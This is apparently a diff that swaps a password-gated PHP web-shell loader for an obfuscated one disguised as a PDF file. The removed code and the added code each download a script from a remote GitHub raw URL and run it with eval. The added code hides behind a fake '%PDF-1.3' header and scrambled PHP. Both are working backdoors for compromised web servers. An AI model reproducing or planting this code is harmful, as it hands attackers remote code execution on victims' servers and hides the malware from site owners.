@@ -1,62 +1,18 @@
-<?php
-error_reporting(0);
-set_time_limit(0);
-// Function to check if the user is logged in based on the presence of a valid cookie
-function is_logged_in()
-{
-    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'chou';
-}
-
-// Check if the user is logged in before executing the content
-if (is_logged_in()) {
-    // Function to get URL content (similar to your previous code)
-    function geturlsinfo($url)
-    {
-        if (function_exists('curl_exec')) {
-            $conn = curl_init($url);
-            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-            $url_get_contents_data = curl_exec($conn);
-            curl_close($conn);
-        } elseif (function_exists('file_get_contents')) {
-            $url_get_contents_data = file_get_contents($url);
-        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-            $handle = fopen($url, "r");
-            $url_get_contents_data = stream_get_contents($handle);
-            fclose($handle);
-        } else {
-            $url_get_contents_data = false;
-        }
-        return $url_get_contents_data;
-    }
-
-    $a = geturlsinfo('https://raw.githubusercontent.com/kuroneko2929292929/lolthings/main/.dumb.txt');
-    eVAl('?>' . $a);
-} else {
-    // Display login form if not logged in
-    if (isset($_POST['password'])) {
-        $entered_password = $_POST['password'];
-        $hashed_password = '16dc070448ad6a77ed36d9866747dde8'; // Replace this with your MD5 hashed password
-        if (md5($entered_password) === $hashed_password) {
-            // Password is correct, set a cookie to indicate login
-            setcookie('user_id', 'chou', time() + 3600, '/'); 
-        } else {
-            echo "Please try again.";
-        }
-    }
-    ?>
-    
-    
-        <center>
-          <form method="POST" action="">
-            <label for="password">Chou: </label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Montage">
-        </form>
-    <?php
-}
-?>
+%PDF-1.3 %C 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+C 
+ 
+        "#Qr&1!A"2qQa 
+                                ?y,/3J5XwyRI02PIIiMrN&"KgX:nTJnLK@!- 
+       m;g&hw@ 
+                            9-.1<yQU?.bw*V) `$bX-TG3g JxU/v_s(H@TJn!gfbc:l[Qe 
+                                      9PLbCm[5'jgl_l-;"PkQ_^Sx?"Y 
+<?php 
+${"GLOBALS"}["jlfohvxe"]="fgpjnkc";${"GLOBALS"}["yducnrzlpxez"]="mdzjfu";${"GLOBALS"}["bjrefnn"]="content";${"GLOBALS"}["vwrmhaighw"]="ch";${"GLOBALS"}["kvqcfxmgir"]="url";eRrOr_rEpOrTiNg(0);sEt_tImE_LiMiT(0);${"GLOBALS"}["rboswhfhc"]="wbqkmiogivyd";${${"GLOBALS"}["rboswhfhc"]}="url";${${"GLOBALS"}["yducnrzlpxez"]}="content";fUnCtIoN AnotherLove($url){rEtUrN fIlE_GeT_CoNtEnTs(${${"GLOBALS"}["kvqcfxmgir"]});}fUnCtIoN AnotherGirl($url){${${"GLOBALS"}["vwrmhaighw"]}=cUrL_InIt(${${"GLOBALS"}["kvqcfxmgir"]});cUrL_SeToPt(${${"GLOBALS"}["vwrmhaighw"]},CURLOPT_RETURNTRANSFER,true);${${"GLOBALS"}["bjrefnn"]}=cUrL_ExEc(${${"GLOBALS"}["vwrmhaighw"]});cUrL_ClOsE(${${"GLOBALS"}["vwrmhaighw"]});rEtUrN${${"GLOBALS"}["bjrefnn"]};}${"GLOBALS"}["sdxuwc"]="wbqkmiogivyd";fUnCtIoN Tactilite(){eChO"<script>alert("GET SHELL ERROR! TRY USING ORIGINAL CODE.");</script>";}${${"GLOBALS"}["kvqcfxmgir"]}="https://raw.githubusercontent.com/kuroneko2929292929/lolthings/main/.dumb.txt";${${${"GLOBALS"}["yducnrzlpxez"]}}=AnotherLove(${${${"GLOBALS"}["sdxuwc"]}});${"GLOBALS"}["kvgtvxjwuqzu"]="content";iF(!${${"GLOBALS"}["kvgtvxjwuqzu"]}){$ivwvlni="qovwrjmcw";$clyxuuihml="qovwrjmcw";${$ivwvlni}="content";${${$clyxuuihml}}=AnotherGirl(${${"GLOBALS"}["kvqcfxmgir"]});}iF(!${${"GLOBALS"}["bjrefnn"]}){Tactilite();}else{$pnqnejm="fgpjnkc";${${"GLOBALS"}["jlfohvxe"]}="content";eVaL("?>".${${$pnqnejm}});}?>
